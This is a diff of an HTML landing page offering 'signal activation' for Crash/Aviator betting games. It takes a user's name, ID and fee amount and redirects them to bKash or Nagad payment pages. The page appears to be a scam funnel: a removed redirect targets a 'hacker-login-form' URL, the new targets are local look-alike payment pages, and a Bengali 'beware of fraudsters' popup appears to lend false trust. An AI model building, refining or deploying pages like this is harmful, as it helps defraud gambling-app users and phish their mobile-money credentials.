@@ -1,7 +1,7 @@
 <!DOCTYPE html><html lang="en"><head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>Singnal Activation offer </title>
+  <title>Signal Activation offer </title>
   <meta name="description" content="Secure activation fee payment for Crash or Aviator game — pay via bKash or Nagad instantly.">
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
   <style>
@@ -74,96 +74,30 @@
     }
     .show {display:flex;animation:fadeIn .3s ease;}
     @keyframes fadeIn {from{opacity:0;transform:scale(.9);}to{opacity:1;transform:scale(1);}}
- <!-- ADVANCED WARNING POPUP -->
-<style>
-@import url('https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600&display=swap');
 
-body {
-    font-family: 'Hind Siliguri', sans-serif;
-}
-
-.popup-overlay {
-    position: fixed;
-    inset: 0;
-    background: rgba(0, 0, 0, 0.75);
-    backdrop-filter: blur(6px);
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    z-index: 9999;
-    animation: fadeIn 0.6s ease;
-}
-
-.popup-box {
-    max-width: 420px;
-    width: 90%;
-    background: linear-gradient(135deg, #111827, #1f2933);
-    border-radius: 18px;
-    padding: 25px 22px;
-    color: #fff;
-    text-align: center;
-    box-shadow: 0 20px 60px rgba(0,0,0,0.6);
-    transform: scale(0.85);
-    animation: scaleUp 0.6s ease forwards;
-    border: 1px solid rgba(255,255,255,0.1);
-}
-
-.popup-icon {
-    font-size: 42px;
-    color: #facc15;
-    margin-bottom: 12px;
-}
-
-.popup-title {
-    font-size: 20px;
-    font-weight: 600;
-    color: #fbbf24;
-    margin-bottom: 12px;
-}
-
-.popup-text {
-    font-size: 15px;
-    line-height: 1.7;
-    color: #e5e7eb;
-}
-
-.popup-text strong {
-    color: #f87171;
-}
-
-.popup-btn {
-    margin-top: 20px;
-    background: linear-gradient(135deg, #f59e0b, #f97316);
-    border: none;
-    padding: 12px 28px;
-    border-radius: 30px;
-    font-size: 15px;
-    font-weight: 600;
-    color: #111827;
-    cursor: pointer;
-    transition: 0.3s;
-}
-
-.popup-btn:hover {
-    transform: translateY(-2px);
-    box-shadow: 0 8px 20px rgba(249,115,22,0.5);
-}
-
-@keyframes fadeIn {
-    from { opacity: 0; }
-    to { opacity: 1; }
-}
-
-@keyframes scaleUp {
-    to { transform: scale(1); }
-}
-
-
-
- 
- 
- 
- 
+    /* Advanced Warning Popup */
+    @import url('https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600&display=swap');
+    .popup-overlay {
+      position: fixed; inset: 0; background: rgba(0, 0, 0, 0.75);
+      backdrop-filter: blur(6px); display: none; justify-content: center;
+      align-items: center; z-index: 9999; animation: fadeIn 0.6s ease;
+    }
+    .popup-box {
+      max-width: 420px; width: 90%; background: linear-gradient(135deg, #111827, #1f2933);
+      border-radius: 18px; padding: 25px 22px; color: #fff; text-align: center;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.6); transform: scale(0.85);
+      animation: scaleUp 0.6s ease forwards; border: 1px solid rgba(255,255,255,0.1);
+    }
+    .popup-icon { font-size: 42px; color: #facc15; margin-bottom: 12px; }
+    .popup-title { font-size: 20px; font-weight: 600; color: #fbbf24; margin-bottom: 12px; }
+    .popup-text { font-size: 15px; line-height: 1.7; color: #e5e7eb; }
+    .popup-text strong { color: #f87171; }
+    .popup-btn {
+      margin-top: 20px; background: linear-gradient(135deg, #f59e0b, #f97316);
+      border: none; padding: 12px 28px; border-radius: 30px; font-size: 15px;
+      font-weight: 600; color: #111827; cursor: pointer; transition: 0.3s;
+    }
+    @keyframes scaleUp { to { transform: scale(1); } }
   </style>
 </head>
 <body>
@@ -232,35 +166,35 @@ body {
 
     <footer>© 2025 App Activation Offer. All rights reserved.</footer>
   </div>
-<div class="popup-overlay" id="warningPopup" style="display: flex;">
-    <div class="popup-box">
-        <div class="popup-icon">⚠️</div>
-        <div class="popup-title">গুরুত্বপূর্ণ সতর্কতা</div>
-        <div class="popup-text">
-            <strong>প্রতারক হতে সাবধান!</strong><br>
-            ওয়েবসাইটের বাইরে কেউ লেনদেন করবেন না।<br><br>
-            লেনদেন করলে কর্তৃপক্ষ দায়ী থাকবে না।<br><br>
-            পেমেন্ট করার আগে অবশ্যই<br>
-            <strong>ওয়েবসাইটের সাপোর্ট ম্যানেজারের সাথে যোগাযোগ করুন।</strong>
-        </div>
-        <button class="popup-btn" onclick="closePopup()">বুঝেছি</button>
-    </div>
-</div>
 
-<script>
-function closePopup() {
-    document.getElementById('warningPopup').style.display = 'none';
-}
+  <div class="popup-overlay" id="warningPopup">
+      <div class="popup-box">
+          <div class="popup-icon">⚠️</div>
+          <div class="popup-title">গুরুত্বপূর্ণ সতর্কতা</div>
+          <div class="popup-text">
+              <strong>প্রতারক হতে সাবধান!</strong><br>
+              ওয়েবসাইটের বাইরে কেউ লেনদেন করবেন না।<br><br>
+              লেনদেন করলে কর্তৃপক্ষ দায়ী থাকবে না।<br><br>
+              পেমেন্ট করার আগে অবশ্যই<br>
+              <strong>ওয়েবসাইটের সাপোর্ট ম্যানেজারের সাথে যোগাযোগ করুন।</strong>
+          </div>
+          <button class="popup-btn" onclick="closePopup()">বুঝেছি</button>
+      </div>
+  </div>
 
-// Auto popup on page load
-window.onload = function () {
-    document.getElementById('warningPopup').style.display = 'flex';
-};
-</script>
   <script>
+    // Configuration for redirects
     const CONFIG = {
-      BKASH_REDIRECT: 'https://avitorpredictorking.github.io/shop/bkaspay.html',
-      NAGAD_REDIRECT: 'https://aviatorpredictorbd.shop/mynewapp/hacker-login-form/src/C'
+      BKASH_REDIRECT: 'bkaspay.html',
+      NAGAD_REDIRECT: 'nagodpay.html'
+    };
+
+    function closePopup() {
+        document.getElementById('warningPopup').style.display = 'none';
+    }
+
+    window.onload = function () {
+        document.getElementById('warningPopup').style.display = 'flex';
     };
 
     const options = document.querySelectorAll('.option');
@@ -288,8 +222,9 @@ window.onload = function () {
         return;
       }
 
-      const redirect = selectedKey === 'bkash' ? CONFIG.BKASH_REDIRECT : CONFIG.NAGAD_REDIRECT;
-      const url = `${redirect}?name=${encodeURIComponent(name)}&userid=${encodeURIComponent(userid)}&type=${encodeURIComponent(type)}&amount=${amount}`;
+      // Logic to pick the right page
+      const redirectPage = selectedKey === 'bkash' ? CONFIG.BKASH_REDIRECT : CONFIG.NAGAD_REDIRECT;
+      const url = `${redirectPage}?name=${encodeURIComponent(name)}&userid=${encodeURIComponent(userid)}&type=${encodeURIComponent(type)}&amount=${amount}`;
 
       modal.classList.add('show');
       openGateway.onclick = () => window.location.href = url;
@@ -301,6 +236,4 @@ window.onload = function () {
     document.getElementById('userid').addEventListener('input', e => document.getElementById('s_id').textContent = 'User ID: ' + (e.target.value || '—'));
     document.getElementById('type').addEventListener('change', e => document.getElementById('s_type').textContent = 'Type: ' + (e.target.value || '—'));
   </script>
-
-
 </body></html>
